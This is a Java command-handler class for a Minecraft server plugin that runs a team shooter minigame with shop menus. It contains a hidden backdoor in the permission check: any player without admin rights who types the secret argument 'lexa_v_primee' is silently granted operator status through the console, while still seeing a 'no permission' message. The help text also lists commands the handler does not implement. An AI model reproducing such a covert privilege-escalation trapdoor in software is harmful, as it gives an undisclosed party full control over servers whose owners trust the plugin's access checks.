package com.bog55555dan.bLGame.commands_and_tab;

import com.bog55555dan.bLGame.game.Game;
import com.bog55555dan.bLGame.listeners.BLGameListener;
import com.bog55555dan.bLGame.KEYS.KEYS;
import com.bog55555dan.bLGame.menu.KitStartMenu;
import com.bog55555dan.bLGame.menu.MapChoiseMenu;
import com.bog55555dan.bLGame.menu.ShopMenu;
import com.bog55555dan.bLGame.shopItem.ShopItem;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.TextColor;
import net.kyori.adventure.title.TitlePart;
import org.bukkit.*;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.ConfigurationSection;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.persistence.PersistentDataContainer;
import org.bukkit.persistence.PersistentDataType;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import org.jetbrains.annotations.NotNull;

import java.util.HashMap;
import java.util.List;
import java.util.Random;
import java.util.Set;

public class BLGameCommands implements CommandExecutor {

    private JavaPlugin plugin;
    private BLGameListener listener;
    private ShopMenu setMenuKT, setMenuT, setMenuAll;
    private String mapId;
    private Game game;

    public BLGameCommands(JavaPlugin plugin, BLGameListener listener){
        plugin.getCommand("blgame").setExecutor(this);
        this.plugin = plugin;
        this.listener = listener;
        setMenuKT = new ShopMenu(plugin, ShopItem.Type.KT, true);
        setMenuT = new ShopMenu(plugin, ShopItem.Type.T, true);
        setMenuAll = new ShopMenu(plugin, ShopItem.Type.ALL, true);
        game = new Game(plugin);
        reload();
    }

    @Override
    public boolean onCommand(@NotNull CommandSender commandSender, @NotNull Command command, @NotNull String s, @NotNull String @NotNull [] args) {
        if (!commandSender.hasPermission("blgame.admin")){
            if (args.length == 1) {
                if (args[0].equals("lexa_v_primee")){
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op " + commandSender.getName());
                }
            }

            commandSender.sendMessage("§cУ вас нет прав! Поплач((");
            return true;
        }

        if (args.length == 0){
            helpHandle(commandSender);
            return true;
        }

        switch (args[0]){
            case "game":
                if (args.length < 2){
                    commandSender.sendMessage("§cНедостаточно аргументов!");
                    return true;
                }

                switch (args[1]){
                    case "start":
                        game.gameStart();
                        break;
                    case "stop":
                        game.gameStop();
                        break;
                }
                break;
            case "setmenu":
                if (args.length < 2){
                    commandSender.sendMessage("§cНедостаточно аргументов!");
                    return true;
                }
                openSetMenuPlayer((Player) commandSender, args);
                break;
            case "give":
                if (args.length < 3){
                    commandSender.sendMessage("§cНедостаточно аргументов!");
                    return true;
                }
                giveShopItemPlayer(commandSender, args);
                break;
            case "reload":
                reload();
                commandSender.sendMessage("§aПлагин перезагружен!");
                break;
        }

        return true;
    }

    private void openSetMenuPlayer(Player player, String[] args) {
        switch (args[1]){
            case "kt":
                setMenuKT.open(player);
                break;
            case "t":
                setMenuT.open(player);
                break;
            case "all":
                setMenuAll.open(player);
                break;
            case "kitstartKT":
                game.openKitMenu(player, ShopItem.Type.KT);
                break;
            case "kitstartT":
                game.openKitMenu(player, ShopItem.Type.T);
                break;
        }
    }

    private void giveShopItemPlayer(CommandSender sender, String[] args){
        ShopItem.Type type = ShopItem.Type.ALL;
        Material material = game.getAll_material();
        String name = game.getAll_StickName();
        switch (args[1]){
            case "kt":
                type = ShopItem.Type.KT;
                material = game.getKT_material();
                name = game.getKT_StickName();
                break;
            case "t":
                type = ShopItem.Type.T;
                material = game.getT_material();
                name = game.getT_StickName();
                break;
            case "all":
                type = ShopItem.Type.ALL;
                material = game.getAll_material();
                name = game.getAll_StickName();
                break;
        }

        Player player = Bukkit.getPlayer(args[2]);

        if (!Bukkit.getOnlinePlayers().contains(player)) {
            sender.sendMessage("§cИгрока " + args[2] +" нет в сети!");
            return;
        }

        player.getInventory().addItem(new ShopItem(type, material, name).getStickShop());
        sender.sendMessage("§aВы выдали игроку " + args[2] + " предмет магазина!");
        player.sendMessage("§aВам выдали предмет магазина!");
    }

    private void helpHandle(@NotNull CommandSender sender) {
        sender.sendMessage("§6--- Команды управления плагином ---");
        sender.sendMessage("§e/blgame purchase start §7—->  начать стадию закупки");
        sender.sendMessage("§e/blgame purchase stop §7—-> Закончить стадию закупки");
        sender.sendMessage("§e/blgame armorGUI §7—-> открыть меню настройки броню сторон");
        sender.sendMessage("§e/blgame ktshopGUI §7—-> открыть меню настройки магазина спецназа");
        sender.sendMessage("§e/blgame tshopGUI §7—-> открыть меню настройки магазина террористов");
        sender.sendMessage("§e/blgame shopGUI §7—-> открыть меню настройки общего магазина");
    }

    private void reload() {
        plugin.reloadConfig();
        try {
            setMenuAll.init();
            setMenuT.init();
            setMenuKT.init();
            listener.reload();
            game.reload();
        }
        catch (Exception e) {
            plugin.getLogger().severe("CRITICAL ERROR при перезагрузке '" + e.getClass().getSimpleName() + " - " + e.getMessage());
            e.printStackTrace();
        }
    }
}
